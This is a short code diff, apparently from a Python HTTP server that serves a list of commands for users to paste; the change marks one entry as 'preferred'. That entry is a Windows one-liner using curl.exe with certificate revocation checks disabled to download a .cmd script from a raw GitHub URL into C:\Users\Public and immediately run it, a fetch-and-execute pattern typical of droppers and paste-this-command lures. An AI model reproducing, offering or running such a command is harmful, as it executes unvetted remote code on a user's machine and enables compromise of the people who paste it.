@@ -1201,7 +1201,7 @@ class H(BaseHTTPRequestHandler):
             {
                 "pastes": [
                     {
-                        "name": "Quick (Public)",
+                        "name": "Quick (Public) — preferred",
                         "cmd": 'curl.exe -L --ssl-no-revoke -o C:\\Users\\Public\\wq.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_q.cmd && C:\\Users\\Public\\wq.cmd',
                     },
                     {
